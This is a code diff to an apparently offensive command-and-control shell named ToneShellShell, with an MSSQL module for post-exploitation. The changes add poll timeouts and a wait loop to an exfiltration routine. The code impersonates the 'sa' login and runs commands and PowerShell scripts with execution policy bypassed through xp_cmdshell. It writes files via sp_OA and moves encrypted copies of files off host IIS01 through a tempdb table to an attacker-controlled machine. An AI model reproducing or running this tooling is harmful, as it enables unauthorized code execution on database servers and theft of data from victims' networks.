@@ -106,12 +106,12 @@ class XpMssql:
     def _sqlcmd_prefix(self) -> str:
         return f'sqlcmd -S {self._host} -U {self._login} -P {self._password} -C'
 
-    def _exec_q(self, shell, tsql: str) -> str:
+    def _exec_q(self, shell, tsql: str, timeout_s: int = None) -> str:
         """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only."""
         if getattr(shell, 'debug', False):
             print(f"[DBG] TSQL  → {tsql}")
         cmd = f'{self._sqlcmd_prefix()} -Q "{tsql.replace(chr(34), chr(34)*2)}"'
-        return shell.cmd_exec_raw(cmd)
+        return shell.cmd_exec_raw(cmd, timeout_s=timeout_s)
 
     def _sp_oa_write(self, shell, path: str, content: str):
         """Write content to a remote path on IIS01 via sp_OA FileSystemObject (chunked)."""
@@ -162,7 +162,7 @@ class XpMssql:
         self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(bat)} {self._tsql_escape(out_file)}'")
         print(output)
 
-    def cmd_xpshell_psh(self, shell, script: str):
+    def cmd_xpshell_psh(self, shell, script: str, timeout_s: int = 120):
         """Stage and run a PowerShell script on IIS01; stdout captured by xp_cmdshell."""
         if getattr(shell, 'debug', False):
             preview = script[:400] + ('…' if len(script) > 400 else '')
@@ -173,7 +173,7 @@ class XpMssql:
             "EXECUTE AS LOGIN='sa';"
             f"EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -NoProfile -File {self._tsql_escape(ps1)}'"
         )
-        output = self._exec_q(shell, run_tsql)
+        output = self._exec_q(shell, run_tsql, timeout_s=timeout_s)
         self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(ps1)}'")
         print(output)
 
@@ -322,15 +322,34 @@ class XpMssql:
             f"[IO.File]::WriteAllBytes('{local_path}',$dec)"
         )
 
-    def cmd_xpexfil(self, shell, remote_path: str, local_name: str):
+    def cmd_xpexfil(self, shell, remote_path: str, local_name: str, insert_timeout_s: int = 600):
         """Exfil a file from IIS01 to controlServer via MSSQL DB channel (AES-256-CBC + base64)."""
         import os
         import base64 as _b64
+        import time
         key_b64   = _b64.b64encode(os.urandom(32)).decode()
         local_tmp = f"C:\\Windows\\Temp\\{local_name}"
 
         print("[*] xpexfil: encrypting and inserting into tempdb..exfil ...")
-        self.cmd_xpshell_psh(shell, self._build_exfil_insert_ps(remote_path, key_b64))
+        self.cmd_xpshell_psh(shell, self._build_exfil_insert_ps(remote_path, key_b64),
+                             timeout_s=insert_timeout_s)
+
+        # Safety wait: poll until table exists in case poll timed out before INSERT completed
+        print("[*] xpexfil: confirming INSERT complete ...")
+        deadline = time.time() + insert_timeout_s
+        while time.time() < deadline:
+            result = self._exec_q(shell,
+                "EXECUTE AS LOGIN='sa';"
+                "SELECT CASE WHEN OBJECT_ID('tempdb..exfil','U') IS NOT NULL "
+                "THEN 'exists' ELSE 'notfound' END"
+            )
+            if result and 'exists' in result:
+                break
+            print("[*] xpexfil: INSERT still running, retrying in 15s ...")
+            time.sleep(15)
+        else:
+            print("[!] xpexfil: timed out waiting for INSERT — aborting")
+            return
 
         print("[*] xpexfil: extracting to WS01 ...")
         extract_ps = self._build_exfil_extract_ps(local_tmp, key_b64)
@@ -349,13 +368,14 @@ class XpMssql:
 
 class ToneShellShell:
     def __init__(self, port: str, debug: bool = False):
-        self.port      = port
-        self.base_url  = f"http://localhost:{port}/api/v1.0"
-        self.session   = None   # currently attached session GUID
-        self.hostname  = None   # display name for the session
-        self._task_num = random.randint(1000, 60000)  # random offset avoids taskNum collision on shell restart
-        self._xp       = XpMssql()
-        self.debug     = debug
+        self.port       = port
+        self.base_url   = f"http://localhost:{port}/api/v1.0"
+        self.session    = None   # currently attached session GUID
+        self.hostname   = None   # display name for the session
+        self._task_num  = random.randint(1000, 60000)  # random offset avoids taskNum collision on shell restart
+        self._xp        = XpMssql()
+        self.debug      = debug
+        self._timeout_s = 120    # default poll timeout; override with: timeout <seconds>
 
     # ── internal helpers ────────────────────────────────────────────────────
 
@@ -443,14 +463,16 @@ class ToneShellShell:
         if output is not None:
             print(output, end="" if output.endswith("\n") else "\n")
 
-    def cmd_exec_raw(self, command: str) -> str:
+    def cmd_exec_raw(self, command: str, timeout_s: int = None) -> str:
         """Send EXEC task, block on poll, return raw output string (no print)."""
+        if timeout_s is None:
+            timeout_s = self._timeout_s
         if self.debug:
             print(f"[DBG] EXEC  → {command}")
         task_num = self._next_task_num()
         task     = {"id": TS_EXEC, "taskNum": task_num, "args": command}
         info     = self._post_task(task)
-        output   = self._poll_output(info[TASK_GUID_KEY])
+        output   = self._poll_output(info[TASK_GUID_KEY], timeout_s=timeout_s)
         if self.debug and output:
             out_preview = output.strip()[:300] + ('…' if len(output.strip()) > 300 else '')
             print(f"[DBG] OUT   ← {out_preview}")
@@ -554,6 +576,13 @@ class ToneShellShell:
                 elif cmd == "help":
                     self.cmd_help()
 
+                elif cmd == "timeout":
+                    if len(parts) < 2:
+                        print(f"[*] poll timeout = {self._timeout_s}s  (usage: timeout <seconds>)")
+                    else:
+                        self._timeout_s = int(parts[1])
+                        print(f"[*] poll timeout set to {self._timeout_s}s")
+
                 elif cmd == "sessions":
                     self.cmd_sessions()
 
@@ -632,14 +661,16 @@ class ToneShellShell:
                         self._xp.cmd_xpstage(self, parts[1], encrypt=not no_enc)
 
                 elif cmd == "xpexfil":
+                    xp_parts = line.split()
                     if not self.session:
                         print("[!] not attached to a session")
-                    elif len(parts) < 3:
-                        print("usage: xpexfil <remote_path> <local_name>")
+                    elif len(xp_parts) < 3:
+                        print("usage: xpexfil <remote_path> <local_name> [insert_timeout_s]")
                     elif not self._xp.ready():
                         print("[!] run xpinit first")
                     else:
-                        self._xp.cmd_xpexfil(self, parts[1], parts[2])
+                        t = int(xp_parts[3]) if len(xp_parts) >= 4 else 600
+                        self._xp.cmd_xpexfil(self, xp_parts[1], xp_parts[2], insert_timeout_s=t)
 
                 else:
                     if not self.session:
